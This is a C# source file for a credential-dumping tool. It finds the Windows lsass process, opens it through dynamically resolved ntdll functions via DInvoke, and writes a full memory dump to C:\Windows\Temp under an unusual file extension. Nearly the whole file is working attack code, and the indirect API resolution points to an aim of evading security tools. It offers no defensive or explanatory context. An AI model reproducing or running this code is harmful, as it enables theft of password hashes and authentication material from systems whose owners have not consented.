using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using DInvoke.DynamicInvoke;
using System.IO;
using System.Threading;

namespace MiniDump
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IO_STATUS_BLOCK
        {
            public uint Status;
            public IntPtr Information;
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtOpenProcessDelegate(
            ref IntPtr ProcessHandle,
            uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID ClientId);

        public const uint PROCESS_QUERY_INFORMATION = 0x0400;
        public const uint PROCESS_VM_READ = 0x0010;

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
        delegate bool MiniDumpWriteDumpDelegate(
            IntPtr hProcess,
            uint ProcessId,
            IntPtr hFile,
            int DumpType,
            IntPtr ExceptionParam,
            IntPtr UserStreamParam,
            IntPtr CallbackParam);

       
        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtCreateFileDelegate(
           out IntPtr FileHandle,
           uint DesiredAccess,
           ref OBJECT_ATTRIBUTES ObjectAttributes,
           out IO_STATUS_BLOCK IoStatusBlock,
           ref long AllocationSize,
           uint FileAttributes,
           uint ShareAccess,
           uint CreateDisposition,
           uint CreateOptions,
           IntPtr EaBuffer,
           uint EaLength
       );

        public const uint STANDARD_RIGHTS_READ = 0x00020000; 
        public const uint FILE_READ_DATA = 0x0001;           
        public const uint FILE_READ_ATTRIBUTES = 0x0080;    
        public const uint FILE_READ_EA = 0x0008;             

        public const uint STANDARD_RIGHTS_WRITE = 0x00020000; 
        public const uint FILE_WRITE_DATA = 0x0002;           
        public const uint FILE_WRITE_ATTRIBUTES = 0x0100;     
        public const uint FILE_WRITE_EA = 0x0010;             
        public const uint FILE_APPEND_DATA = 0x0004;          

        public const uint SYNCHRONIZE = 0x00100000;             

        public const uint FILE_GENERIC_READ = STANDARD_RIGHTS_READ | FILE_READ_DATA | FILE_READ_ATTRIBUTES | FILE_READ_EA | SYNCHRONIZE;
        public const uint FILE_GENERIC_WRITE = STANDARD_RIGHTS_WRITE | FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | FILE_WRITE_EA | FILE_APPEND_DATA | SYNCHRONIZE;

        public const uint FILE_SHARE_READ = 0x00000001;
        public const uint FILE_SHARE_WRITE = 0x00000002;
        public const uint FILE_OPEN_IF = 0x00000003;
        public const uint OBJ_CASE_INSENSITIVE = 0x00000040;
        public const uint FILE_SYNCHRONOUS_IO_NONALERT = 0x00000020;

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool NtCloseHandleDelegate(IntPtr hObject);

        public enum MINIDUMP_TYPE
        {
            MiniDumpNormal = 0x00000000,
            MiniDumpWithFullMemory = 0x00000002,
            MiniDumpWithHandleData = 0x00000004,
            MiniDumpWithThreadInfo = 0x00001000
        }

        

        static void Main(string[] args)
        {
            string processName = "lsass";
            string dumpFilePath = @"\??\C:\Windows\Temp\du_du.dux";
            

            Process[] processes = Process.GetProcessesByName(processName);
            if (processes.Length == 0)
            {
                Console.WriteLine("Prcess {0} not found.", processName);
                return;
            }

            Process hProcess = processes[0];
            Console.WriteLine("Process {0} found with PID: {1}", processName, hProcess.Id);

            int PID = hProcess.Id;

            IntPtr ntOpenPro = Generic.GetLibraryAddress("ntdll.dll", "NtOpenProcess", true);
            IntPtr dbghelpHandle = Generic.GetLibraryAddress("dbgcore.dll", "MiniDumpWriteDump", true);
            IntPtr ntCreateFilePtr = Generic.GetLibraryAddress("ntdll.dll", "NtCreateFile", true);
            IntPtr ntclHandle = Generic.GetLibraryAddress("ntdll.dll", "NtClose", true);

            var ntOpenProcess = (NtOpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(ntOpenPro, typeof(NtOpenProcessDelegate));
            var miniDumpWriteDump = (MiniDumpWriteDumpDelegate)Marshal.GetDelegateForFunctionPointer(dbghelpHandle, typeof(MiniDumpWriteDumpDelegate));
            var ntCreateFile = (NtCreateFileDelegate)Marshal.GetDelegateForFunctionPointer(ntCreateFilePtr, typeof(NtCreateFileDelegate));
            var closeHandle = (NtCloseHandleDelegate)Marshal.GetDelegateForFunctionPointer(ntclHandle, typeof(NtCloseHandleDelegate));

            

            CLIENT_ID clientId = new CLIENT_ID
            {
                UniqueProcess = (IntPtr)PID,
                UniqueThread = IntPtr.Zero
            };

            OBJECT_ATTRIBUTES objectAttributesProcess = new OBJECT_ATTRIBUTES
            {
                Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES)),
                RootDirectory = IntPtr.Zero,
                ObjectName = IntPtr.Zero,
                Attributes = 0,
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = IntPtr.Zero
            };

            IntPtr processHandle = IntPtr.Zero;

            int statusProcess = ntOpenProcess(
                ref processHandle,
                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                ref objectAttributesProcess,
                ref clientId
            );

            if (statusProcess != 0 || processHandle == IntPtr.Zero)
            {
                Console.WriteLine("It was not possible to get the process handle");
                return;
            }

            try
            {

                
                UNICODE_STRING unicodeFilePath = new UNICODE_STRING
                {
                    Length = (ushort)(dumpFilePath.Length * 2),
                    MaximumLength = (ushort)((dumpFilePath.Length * 2) + 2),
                    Buffer = Marshal.StringToHGlobalUni(dumpFilePath)
                };

                
                OBJECT_ATTRIBUTES objAttrFile = new OBJECT_ATTRIBUTES
                {
                    Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES)),
                    RootDirectory = IntPtr.Zero,
                    ObjectName = Marshal.AllocHGlobal(Marshal.SizeOf(unicodeFilePath)), 
                    Attributes = OBJ_CASE_INSENSITIVE,
                    SecurityDescriptor = IntPtr.Zero,
                    SecurityQualityOfService = IntPtr.Zero
                };

                Marshal.StructureToPtr(unicodeFilePath, objAttrFile.ObjectName, true);

               
                IO_STATUS_BLOCK ioStatusBlock = new IO_STATUS_BLOCK
                {
                    Status = 0,
                    Information = IntPtr.Zero
                };

                IntPtr fileHandle;
                long allocationSize = 0;

              
                int status = ntCreateFile(
                    out fileHandle,
                    FILE_GENERIC_READ | FILE_GENERIC_WRITE,   
                    ref objAttrFile,
                    out ioStatusBlock,
                    ref allocationSize,
                    0,                      
                    FILE_SHARE_READ | FILE_SHARE_WRITE, 
                    FILE_OPEN_IF,            
                    FILE_SYNCHRONOUS_IO_NONALERT, 
                    IntPtr.Zero,             
                    0);                       


                if (status != 0 || fileHandle == IntPtr.Zero)
                {
                    Console.WriteLine($"Error creating file. Error code: 0x{status:X}");
                    closeHandle(fileHandle);
                    Marshal.FreeHGlobal(unicodeFilePath.Buffer);
                    Marshal.FreeHGlobal(objAttrFile.ObjectName);
                    return;
                }

                Console.WriteLine("File created succesfully.");
                Console.WriteLine("fileHandle: 0x{0:X}", (long)fileHandle);


                bool result = miniDumpWriteDump(
                    processHandle,
                    (uint)PID,
                    fileHandle,
                    (int)MINIDUMP_TYPE.MiniDumpWithFullMemory,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero
                );

                if (result)
                {
                    Console.WriteLine("Memory dumped succesfully in {0}.", dumpFilePath.Substring(4));
                }
                else
                {
                    Console.WriteLine("Error dumping memory");
                }

                                
                Marshal.FreeHGlobal(unicodeFilePath.Buffer);
                Marshal.FreeHGlobal(objAttrFile.ObjectName);
                closeHandle(processHandle);

                closeHandle(fileHandle);
                

            }
            catch (Exception ex)
            {
                Console.WriteLine("Errorx: " + ex.Message);
            }
            
        }
    }
}

